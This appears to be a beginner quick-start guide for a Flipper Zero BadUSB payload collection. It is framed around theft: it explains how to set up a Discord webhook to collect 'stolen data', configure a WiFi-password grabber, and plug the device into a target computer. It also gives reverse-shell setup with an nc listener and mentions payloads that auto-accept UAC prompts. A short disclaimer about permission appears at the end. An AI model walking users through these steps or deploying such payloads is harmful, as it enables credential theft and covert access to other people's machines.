# 🚀 Quick Start Guide

**Complete beginner? No problem!** This guide gets you running payloads in under 10 minutes.

---

## ⚡ What You'll Need

- ✅ Flipper Zero
- ✅ Computer to configure payloads
- ✅ Discord account (free) - for receiving stolen data
- ✅ Target device to test on

---

## 📝 Step-by-Step Setup

### Step 1: Create Discord Webhook (2 minutes)

This is where Flipper sends stolen data like WiFi passwords, screenshots, etc.

**Instructions:**

1. Open **Discord** on your computer or phone
2. Create a new server (or use existing one)
   - Click the **+** button → **Create My Own** → **For me and my friends**
   - Name it anything (e.g., "Flipper Data")
3. Right-click the server name → **Server Settings**
4. Go to **Integrations** → **Webhooks**
5. Click **New Webhook**
6. Click **Copy Webhook URL**

**You'll get a URL like this:**
```
https://discord.com/api/webhooks/1234567890/AbCdEfGhIjKlMnOpQrStUvWxYz
```

✅ **Save this URL somewhere!** You'll need it in Step 3.

---

### Step 2: Download a Payload (1 minute)

**For your first time, start with something simple:**

#### Option A: Just for Fun (No setup needed!)
```
payloads/windows/fun/rickroll.txt
```
Opens Rick Roll video - perfect for testing!

#### Option B: Steal WiFi Passwords (Requires Discord webhook)
```
payloads/windows/exfiltration/wifi_grabber.txt
```
Grabs all saved WiFi passwords and sends to Discord.

**Download the file** or copy it from the GitHub repo.

---

### Step 3: Configure the Payload (2 minutes)

#### If you chose Rick Roll (Option A):
✅ **Skip this step!** Rick Roll needs no configuration.

#### If you chose WiFi Grabber (Option B):

1. **Open the `.txt` file** in any text editor:
   - Windows: Right-click → **Open with** → **Notepad**
   - Mac: Right-click → **Open With** → **TextEdit**
   - Linux: Any text editor

2. **Find this part** (around line 18):
   ```
   $env:DC='YOUR_DISCORD_WEBHOOK'
   ```

3. **Replace `YOUR_DISCORD_WEBHOOK`** with your actual webhook from Step 1:
   
   **BEFORE:**
   ```
   $env:DC='YOUR_DISCORD_WEBHOOK'
   ```
   
   **AFTER:**
   ```
   $env:DC='https://discord.com/api/webhooks/1234567890/AbCdEf...'
   ```

4. **Save the file** (Ctrl+S or Cmd+S)

✅ **Done!** Your payload is ready.

---

### Step 4: Copy to Flipper Zero (3 minutes)

You have 2 options:

#### Option A: Using qFlipper (Easier)

1. **Download qFlipper** from flipper.net if you don't have it
2. **Connect Flipper** to your computer via USB
3. **Open qFlipper**
4. In qFlipper, navigate to: **SD Card** → **badusb** folder
   - If `badusb` folder doesn't exist, create it
5. **Drag and drop** your `.txt` file into the `badusb` folder

#### Option B: Using SD Card Reader

1. **Turn off Flipper**
2. **Remove SD card** from Flipper
3. **Insert SD card** into your computer
4. **Open the SD card** and go to the `badusb` folder
   - If `badusb` folder doesn't exist, create it
5. **Copy your `.txt` file** into the `badusb` folder
6. **Eject SD card** safely
7. **Put SD card back** in Flipper

---

### Step 5: Run the Payload! (1 minute)

**On your Flipper:**

1. Navigate to: **Apps** → **USB** → **Bad USB**
2. Select your payload (e.g., `wifi_grabber.txt`)
3. **Plug Flipper into target computer** via USB
4. Press the **OK button** (center button) to run

**What happens:**
- Flipper types commands super fast (like keyboard)
- Payload runs automatically
- Data gets sent to your Discord webhook
- Check your Discord server for results!

---

## 🎯 Your First Test

Try this ultra-simple test payload to make sure everything works:

### Create `test.txt`:
```duckyscript
REM === Test Payload ===
REM Opens Notepad and types a message
DELAY 1000
GUI r
DELAY 500
STRING notepad
ENTER
DELAY 1000
STRING Hello from Flipper Zero!
ENTER
STRING It works!
```

1. Save this as `test.txt`
2. Copy to Flipper (`badusb/test.txt`)
3. Run on Windows computer
4. You should see Notepad open with your message!

---

## 🔧 Troubleshooting

### "Nothing happened when I ran the payload"

**Try these fixes:**

1. **Increase delays** - Some computers are slower
   - Open your `.txt` file
   - Find lines like `DELAY 500`
   - Change to `DELAY 1000` or `DELAY 2000`

2. **Check USB connection**
   - Make sure Flipper is plugged in correctly
   - Try a different USB port

3. **Keyboard layout**
   - Payloads assume US QWERTY keyboard
   - If you have different layout, it may type wrong characters

### "UAC prompt appeared and payload stopped"

Some payloads need admin rights. The target user needs to:
- Click **Yes** on the UAC prompt, OR
- The payload will add delays and auto-click Yes (check payload comments)

### "Discord didn't receive anything"

**Check these:**

1. **Webhook URL correct?**
   - Make sure you copied the ENTIRE webhook URL
   - Should start with `https://discord.com/api/webhooks/`

2. **Target has internet?**
   - Payloads need internet to send data to Discord

3. **Firewall blocking?**
   - Some firewalls block PowerShell/Bash from accessing internet

### "Payload typed wrong characters"

Your target has a different keyboard layout. Payloads are designed for US QWERTY.

**Fix:** Test on a computer with US keyboard layout.

---

## 📋 Configuration Cheat Sheet

### Discord Webhooks
```
Find: YOUR_DISCORD_WEBHOOK
Replace with: https://discord.com/api/webhooks/YOUR_ACTUAL_WEBHOOK
```

### Reverse Shells
```
Find: YOUR_IP and YOUR_PORT
Replace with: Your computer's IP (192.168.1.100) and port (4444)

Set up listener first:
nc -lvnp 4444
```

### Custom URLs
```
Find: YOUR_URL
Replace with: Any URL you want (e.g., https://example.com)
```

---

## 🎓 Platform-Specific Notes

### Windows
- ✅ Most compatible platform
- Some payloads need admin (UAC prompt appears)
- Windows Defender may block some actions

### Linux
- Opens terminal with `CTRL ALT t`
- Needs `curl` installed (usually already there)
- May need sudo password for some payloads

### macOS
- Opens terminal with Spotlight (`GUI SPACE`)
- Security prompts may appear
- Some features blocked by System Integrity Protection (SIP)

### iOS
- **Device MUST be unlocked**
- Very limited - can only open apps and type
- No terminal = no modular payloads available

---

## 📚 Next Steps

Once you're comfortable with the basics:

1. **Explore more payloads** - Check `payloads/` folder for 42 different options
2. **Read full docs** - See [README.md](README.md) for advanced features
3. **Test safely** - Use virtual machines (see [TESTING.md](TESTING.md))
4. **Create your own** - Modify existing payloads or create new ones

---

## ⚠️ Important Reminders

- ✅ **Test on your OWN devices only**
- ✅ **Get written permission** for any testing on other systems
- ✅ **Use virtual machines** for dangerous payloads
- ❌ **NEVER use on systems you don't own** - that's illegal!

See [DISCLAIMER.md](DISCLAIMER.md) for full legal information.

---

## 🆘 Need More Help?

- **Check payload files** - They have comments explaining configuration
- **Read the README** - [README.md](README.md) has detailed info
- **Open an issue** - GitHub issues for bug reports or questions
- **Check TESTING.md** - [TESTING.md](TESTING.md) for VM setup and safety

---

**Happy hacking! 🐬**

*Remember: With great power comes great responsibility. Use ethically!*
